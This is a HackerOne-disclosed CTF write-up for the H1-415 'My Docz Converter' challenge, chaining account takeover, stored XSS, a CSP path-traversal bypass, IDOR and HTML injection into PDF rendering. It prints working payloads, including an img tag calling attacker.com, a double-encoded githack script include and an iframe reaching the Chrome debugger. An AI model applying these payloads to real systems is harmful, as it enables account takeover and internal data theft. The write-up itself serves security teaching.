@@ -1,0 +1,301 @@
+ReportLink:https://hackerone.com/reports/780285
+WeaknessName:Security Through Obscurity
+Reporter:https://hackerone.com/w--
+ReportedTo:h1-415-ctf(h1-415-ctf)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:03.02.2020 21:41:34
+
+Summary:
+
+# H1-415 CTF Writeup 
+
+## Intro
+
+HackerOne kicked off this year's H1-415 CTF with the following tweet:
+
+{F692033}
+
+Loading the target challenge website shows that the website is called `My Docz Converter`.  A quick look at the challenge website shows that it allows users to register an account and then upload an image to be converted to PDF.  My first thoughts were that there would likely be some type of template, script or command injection in the PDF generation process.  This ultimately turned out to be one of the last steps for this CTF!
+
+## Starting - No vulnerabilities yet!
+
+I got a somewhat late start on this CTF since I didn't see the challenge announcement until it was already a day in to the competition.  By that point there had already been two people who solved it, which I was hoping a sign that it wouldn't be *too* difficult overall!
+
+Starting a CTF challenge is often the hardest point since there's so many things to be explored, attempted, etc.  This challenge was no different.  The home page of the challenge website redirects to `/login`.  The login page then shows that you can either log in, or register an account if you need one.  To log in an email and password is needed - and the API call makes use of a CSRF token.  To register a name, email, username, and password is needed.    The registration page also notes: `This is a trial version. Your account will be disabled after a while.`.
+
+After registering an account images can be converted into PDF's and then viewed on the documents page.  The PDF includes a "trial" notice and our user's name.  There is also a link to `Support`, but the website notes that `Support chat is available for customers only`.  This seems like an obvious hint or future target.  If only we could be a real customer like Jobert....
+
+{F692041}
+
+## First vulnerability
+
+Before hitting on the first vulnerability it's worth noting that I attempted a variety of things:
+
+- Cross site scripting in the username: No
+- Template injection in the PDF via username: No
+- Upload SVG's instead of PNG / JPG: No
+- Register the same username as someone else: No
+- Edit the profile of a different user ID: No
+- QR codes - so many QR codes: No
+- Others: No
+
+At this point there were still many additional things to try, however I noticed that the first hint for this CTF had been posted:
+{F692050}
+
+This first hint was actually *2* hints in one.  I had seen Jobert's testimonial on the challenge site login page initially, but did not think anything of it.  Going back to it, the hint is obvious:
+{F692055}
+
+We can see there is a property `data-email` with the value `jobert@mydocz.cosmic`.  As far as I know `.cosmic` isn't a valid TLD, so our only use for this email was going to be on the challenge website.  To confirm this, I attempted to register an account with `jobert@mydocz.cosmic` as my listed email address.  Sure enough, the server reported an error indicating that the email was already in use.
+
+That leads to the second part of the hint: `Can anyone here help us with some regex`.  It was this second part of the hint that was the biggest help.  When registering an account normally I had observed two behaviours:
+
+1) Special characters are silently stripped from the `Name` and `Username` fields
+2) QR recovery codes contain details for the account registered
+
+When registering `demo@demo.com` as a user account, for example, the following QR recovery code is given:
+
+{F692062}
+
+This code decodes to (using any QR code decoder):
+
+````
+64656d6f4064656d6f2e636f6d:0f31a3904e808a832c2cef2bdfab06b7168ff6103637a14c72ca72cb31784644056ea258f8f81999d5d87a2c3ea7ef2903c857ac2e4daef6eaf8c99d6264a6976d8ee331f68a0d5b5b8bf75a7324e63c2e7322d81104d6c2b5acbbeafb4d91f6515867767f661d352bfcbe19a9579cfa194f7e4708696acffe1d07927a6905ff
+```
+
+The first part is `64656d6f4064656d6f2e636f6d`.  Converting this from `hex` to `ascii` shows our email `demo@demo.com`.  The hint says we need to figure out a regex for Jobert's email that we have discovered.  After a couple failed tries at inserting whitespace at the end of the email to register with I realized that we can use the server's special character deletion behaviour to our advantage.  Here's the steps:
+
+First: register a new account.  In the email field we need to include special characters, but these are blocked by client side Javascript.  Burp Suite Pro easily solves that for us.  We can simply edit the raw `POST` request to the `/register` endpoint to contain these special characters.  For example:
+
+```
+POST /register HTTP/1.1
+Host: h1-415.h1ctf.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 153
+Cookie: _csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384; session=eyJfY3NyZl90b2tlbiI6IjQwNzg0OWViZTE2YWRlMWNmYTk5ODhlMjQ5MTY1Y2U4ZWMxMWUzODQiLCJjaGF0IjpbXSwiZW1haWwiOiJmYWtlQGZha2U4OC5jb20iLCJ1c2VyX3R5cGUiOjN9.XiebQg.uxyF3T2cF7YDXjmsiDhJWJnrmUA
+
+name=demo&email=jobert%40mydocz.cosmic<<<&username=demo&password=password123&password-confirmation=password123&_csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384
+```
+
+In the above `POST` request we use `jobert%40mydocz.cosmic<<<` instead of `jobert%40mydocz.cosmic`.  My first try at this failed and threw me off for a bit.  It turns out that someone else had already registered `jobert%40mydocz.cosmic<<<`!
+
+Now we're ready for the second step: At this point we have an account registered with a variation of Jobert's email, but nothing more.  As soon as we register the account we are given a QR recovery code however.  We can save this code and log out.  Now we access the account recovery page at `/recover`.  When we upload the QR code it will contain the email `jobert@mydocz.cosmic<<<`.  This will be sanitized down to `jobert@mydocz.cosmic` and is otherwise a valid recovery code so access is granted.  At last we now have access Jobert's account!
+
+{F692075}
+
+## First vulnerability - TLDR
+
+1) Our target account is `jobert@mydocz.cosmic` as hinted at on the login page.
+2) The `/register` API will allow special characters at the end of an email address. 
+3) Most other API's on this server silently remove any special characters from the input.  We can leverage this behaviour to register a variation on the target email like `jobert@mydocz.cosmic<<>><<<`
+4) After successfully registering, the "recovery" QR code can be used with the `/recover` API.  The special characters in the input email will be removed during the API processing, resulting in access to the `jobert@mydocz.cosmic` account.
+
+## Second vulnerability
+
+Even thought we now have access to Jobert's account, there are no documents listed in this account on the `Documents` page so it appears that more steps will be needed to complete this challenge.  Since everyone working on the CTF is sharing this server, making changes to Jobert's account are disabled.  This includes uploading documents or changing profile details.  Not being able to access any of these functions helps narrow down where we should look for the next vulnerability.  Unlike any regular accounts that can be registered, Jobert's account has access to the `/support` page.
+
+On the support page, a "chatbot" style interface loads.  Similar to real life customer service chatbots, this interface responds with random nonsense for every input that is given.  I immediately noticed that this support page is vulnerable to an XSS attack.  User input isn't sanitized in any way, it's just printed out to the page.  Even though self-XSS is great for bounty programs (just kidding...), it doesn't immediately help us here.
+
+Each message you input to the chatbot is passed as a `GET` request to the following API:
+
+```
+/support/chat?message=<input>
+```
+
+The server then responds with a JSON encoded message.  Testing did not show anything promising for the input being entered.  What *was* noticeable however was that a new cookie value is set after each call to this API, and the length of the cookie value named `session` would vary depending on both the user input *and* the server output.
+
+Examining the `session` cookie values showed that they appear to be `Base64` encoded, and they would always start with the same few characters: `eJw9y0...`.  This led to a fair amount of time unsuccessfully spent trying to decode/decrypt this cookie value.  It turns out that there is no need to actually gain access to this cookie parameter.
+
+Looking for what I might be missing with the session token decryption I notice that there was a *fairly obvious* additional function in the chat bot.  The Javascript client side script for the support function is loaded from `/js/support.min.js`.  Reviewing this file shows the following line:
+
+```
+if("finish"!==t.toLowerCase()&&"quit"!==t.toLowerCase())
+```
+
+Typing either of those words in as input to the chatbot displays a dialog for submitting feedback:
+
+{F692168}
+
+Clicking submit on this dialog causes a `POST` request to be made to `/support/feedback`.  This request includes a parameter named `rating`, and a CSRF token.  Further testing of the feedback API showed that if a rating of 2, 3, 4, or 5 stars was given, the server response would be:
+
+```
+Thank you for your review!
+```
+
+But if only 1 star was given as a rating (and passed to the feedback API), the response would instead be:
+
+```
+Thank you for your review! Our team will review it shortly.
+```
+
+This clue gives away what we'll need to do for our next vulnerability - we need to enter some sort of malicious input for the "support team" to review.  Since we know there's a XSS vulnerability in the support page it seems like there's a good chance it will affect the feedback review page too.  It also then makes sense why the `session` cookie value was being updated to include our user input: The feedback API will make use of our session cookie and load our chat session input from it.
+
+To confirm this vulnerability I entered an image tag as part of my support chat input, and set the path to an external server I controlled:
+
+```
+<img src=http://attacker.com/aaaaaa/>
+```
+
+I then called the feedback API giving my support session a 1 star rating.  Sure enough, on my external server I saw the request for the image come through:
+{F692182}
+
+This confirmed a HTML injection and potential XSS on the support page.  Getting a working XSS was the next step.
+
+## Second vulnerability - TLDR
+
+1) From Jobert's account access the `/support` page.
+2) Leverage the HTML injection / XSS on the support page by passing in HTML tags to the support chat.  For example, use an image tag that references an external server.
+3) Type in `finish` or `quit` to display the "Feedback" dialog. 
+4) Mark your support session feedback as a 1 star rating to trigger the "support team" to "review" it.
+5) A copy of the input from the support chat will be rendered on the support agent's browser, which turns out to just be a script running headless Chrome.  Our image tag will load, causing an external HTTP request to be made confirming this vulnerability path.
+
+## Second vulnerability - Part 2
+
+Getting the first part of this vulnerability working was actually fairly trivial except for the fact that I initially missed the feedback dialog option.  With the ability to cause arbitrary HTML content to sent to the "support team", it seemed pretty clear that we would need to take over their session to gain additional privileges on the `My Docz` system.  To take over a session though, we would almost certainly need Javascript execution.
+
+Back at the support chat page, I noticed that while it appeared I had a XSS vulnerability, my browser wasn't actually executing any Javascript payloads.  Instead, all Javascript was being blocked due to the server's Content Security Policy (CSP).  Looking at the response headers, the following CSP rules are set by the server:
+
+```
+Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *
+```
+
+The `default-src` policy means that anything not otherwise listed will also be set to `self`.  In the world of CSP, `self` doesn't mean "accept anything on the webpage", it instead means "do not run any script content that is included directly on the page, only accept scripts hosted on this server".  In other words, all the Javascript files hosted in under `https://h1-415.h1ctf.com/` could be loaded fine, but attempting to add our own Javascript content directly on the support chat page would fail.
+
+The one addition in the CSP apart from `self` is the `script-src` value of `https://raw.githack.com/mattboldt/typed.js/master/lib/`.  This seemed like an odd addition to the CSP rules since all other Javascript is referenced from scripts directly hosted on the challenge website.  Since the whole directory `/mattboldt/typed.js/master/lib` is allowed according to the CSP, I checked to see what other scripts could be referenced.  This turned out to be a dead end, nothing else of value was in the directory:
+{F692198}
+
+The second unusual thing about this CSP rule was that normally a base domain is whitelisted, not a full URL path.  This was new to me, so I spent some time on Google to determine how fully qualified URLs and paths are handled in CSP rules.  This turned out to be way more frustrating than expected.  For example, the following page is a common reference for CSP details:
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
+
+Looking through the whole page, there is no mention at all of how paths are handled.  So I moved on to testing Chrome's CSP behaviour myself.  This showed that:
+
+- If the CSP includes a full URL, Chrome will treat any content under that URL path (any file or subdirectory) as allowed.
+- Chrome will block anything in parent directories or the base server.
+- Paths are "normalized" before evaluating, meaning that simply path traversals are blocked.
+
+While attempting a basic path traversal against the CSP policy failed, it made me wonder how Chrome would have any idea whether or not a path traversal was taking place.  Testing showed that Chrome evaluates the "resulting" path the same way as when you're entering an URL in the address bar.  If I enter `http://exfiltrated.com/url/demo/../test` in my browser, the URL that Chrome will request will be `http://exfiltrated.com/url/test`. 
+
+This led to the next obvious thing to try, _URL encoding the path_ to prevent it from being normalized.  If you've ever made URL encoded requests to a web server you will know that *servers* often do not care if a path is URL encoded, they will first decode your requested path and then attempt to load your page.  For CSP's I quickly discovered that Chrome would appear to know that `%2e` was the same as `.`, but it would not decode `%2f` as `/`.  This means that Chrome CSP parser *would* accept the following URL:
+
+```
+https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fmyuser/myproject/master/attacker.js
+```
+
+I quickly tested to see how the Githack server would handle this style of request and it turns out to happily parse our URL encoded path, follow the traversal, and give us our target page!  This means we can finally bypass the CSP policy on this website by hosting our own Javascript on Github and then using a path traversal to reference that script.  Note that githack.com is basically just a proxy service for Github, so having our own content hosted on that domain is as simple as making a new Github repository.
+
+To reference the Github hosted script on the support page I used the following for the message contents:
+
+```
+<script src="https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fw--/a/master/csp-done19.js"></script>
+```
+
+Note that our %2f path is URL encoded twice - once for the original `/support` page to decode, and once to bypass the CSP policy on the support team bot's browser.  A hint / Easter egg at this point is that any time you include a script tag in your message to the support chat the response is:
+
+```
+Wow, that's cosmic.
+```
+
+I'm not sure if a <script> tag is truely cosmic brain, but it's on the right path :)  
+
+Triggering this message to be reviewed by the support team bot finally resulted in a successful XSS attack!  Unfortunately I ended up being stuck here for a couple hours due to instability on the challenge server, and a couple bugs in my Javascript.  The challenge server would restart hourly (at 35 minutes past the hour), but between the restarts it would sometimes end up in bad states.  One of these was the state where the `/support/feedback` API wouldn't actually trigger the support chat being loaded by the support team bot.  This was simple enough to debug, but ultimately took a while.
+
+With full XSS access I started to look into how we could leverage the support team bot's session.  Unfortunately session cookies were set to `httponly` so only the `csrf` token could be retrieved from the cookies.  After spending some time looking at the page details that was loaded on the support bot browser I eventually looked up the `window.location` value.  This showed that the URL the support bot was accessing the chat log from was:
+
+```
+http://localhost:3000/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb 
+```
+
+Rather than attempting to make requests to this via `XMLHttpRequest's`, I tried the following URL in my browser:
+
+```
+https://h1-415.h1ctf.com/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb 
+```
+
+...and it worked!  Our support chat session is loaded, along with some additional user details.
+{F692380}
+
+## Second vulnerability - Part 2 - TLDR
+
+1) A CSP is blocking all script execution.
+2) The `script-src` rule allows scripts from `https://raw.githack.com/mattboldt/typed.js/master/lib/`.
+3) We can abuse the allowed path by URL encoding our script path.  Use `%2f` instead of `/` to perform a directory traversal server-side, but trick Chrome into thinking we are still referencing a valid path.  For example: `https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fmyuser/myproject/master/attacker.js`.
+4) In our attacker Javascript we need to read the `window.location` property to find the magic URL that will give us access to the support feedback review page.
+
+## Third vulnerability 
+
+Having access to the support feedback review page at first only appears to give access to a copy of our own messages.  It also shows Jobert's profile details, but we *also* already have access to those.  This page, just like the `/settings` page examined earlier also does not let us change Jobert's details.  The only new item appears to be the `Ban User` button.  
+
+Examining the `Ban User` button showed that it is disabled *and* no Javascript appears to exist to handle any actions if it were enabled.  The `Save` button causes a `POST` request to the `/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb` URL instead of the normal `/settings` URL, but otherwise appeared the exact same.
+
+One of the things I noticed on the `/settings` page as a regular user is that the request includes a parameter `user_id`, which is just a numeric value.  The same parameter is passed when the `/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb` API is accessed.  As a test, I changed this to a random number, and unlike on the `/settings` API this worked.  To confirm, I registered a new user account and looked up the `user_id` value on the `/settings` page.  Then I made a change via the support page to my test user.  Sure enough, the changes took effect.
+
+Right from the beginning of this challenge it felt like abusing the PDF generation should be part of the CTF, so the first thing I tried was to include special characters in the `name` field when updating via the support page.  This time it worked!
+
+Trying template injection attacks like `{{7*7}}` and `${7*7}` was not successful.  Including HTML tags however *was* successful and these rendered inside the PDF.  Since the `name` field length was limited I attempted to reference an external Javascript page source.  This time no CSP policy blocked the script and I could directly load Javascript from any URL!
+
+At this point I started enumerating details about the PDF generation page.  The URL the page was called from was:
+
+```
+http://localhost:3000/converter/bd0bde8f600a8a6df01ed973809cc7bc4e487a00212df0085ec6ef4f4deb42a9?user_name=demo
+```
+
+Unlike on the second vulnerability, accessing this URL was not possible via the `https://h1-415.h1ctf.com/` website - a error `403` would be returned.  After trying a lot of things I scripted outputting all of the `document` object properties.  This unfortunately did not give any more clues.  During this process however I did observe that I could easily extract page outputs, even across other websites by including a `<iframe>` tag.  The PDF would render and display the `iframe` contents.  This led to a lot of failed attacks:
+
+- Access other internal network hosts
+- Find an accessible page on the webserver on localhost running on port 80 (as opposed to 3000)
+- Find a page on port 3000 that the PDF rendering system could access
+- Access the local filesystem via `file://`
+
+A variety of other CTF's in the past have included challenges where reading files via the `file://` handler was required.  Checking into the Chrome policies for this however showed that no access to pages on `file://` is allowed *at all* unless the parent page is also loaded from a `file://` path:
+
+{F692405}
+
+Looking at options for loading files from Chrome however led to a reference to the Chrome debugger, which for headless version of Chrome especially is often enabled.  On the second vulnerability and on this one the user agent indicated that headless Chrome was in use, so this seemed like a good possibility.  By default, the debugger port in on `9222`.  To check if this was accessible the following script code was used:
+
+```
+document.write("<hr><iframe src='http://localhost:9222/' width='900' height='1000'></iframe>");
+```
+
+Sure enough it *was* accessible.  The default page doesn't show much, so the next page I checked was `http://localhost:9222/json`.  Finally this revealed what was needed:
+{F692408}
+
+As we can see in the output, on another tab / window a page with the following URL was open:
+
+```
+http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf
+```
+
+## Third vulnerability - TLDR
+
+1) The support chat review page allows for review support chats *and* for updating user account properties
+2) From the support review page, *any* user account can be updated (just not Jobert's account!)
+3) The support review page *also* does not strip special characters, allowing for HTML to be injected into a user's name field
+4) The user's name field is rendered in the PDF when an image is converted.  If it contains HTML it will be parsed and rendered as HTML content
+5) A script tag can be injected including remote scripts to get around any length restrictions for the HTML injection
+6) Using a script we can inject an `<iframe>` into the PDF output.  This can be used to load a view of the Chrome debugger on port `9222`
+7) Inspect the open pages via the Chrome debugger's `/json` endpoint to discover the secret document URL.
+
+## Jobert's Missing Document
+
+At long last we have the magic hash for Jobert's lost document.  Testing previously showed that access to document URL's are not restricted, they are simply protected by each having a unique hash.  This meant that we could access the missing document simply by accessing:
+
+```
+https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab
+```
+
+This gives the document including the flag:
+
+```
+h1ctf{y3s_1m_c0sm1c_n0w}
+```
+
+It would only be fitting to make a meme for this, so here's my attempt:
+{F692449}
+
+## Impact
+
+Does anyone else wonder if this was the inspiration for this CTF?: https://hackerone.com/reports/745324
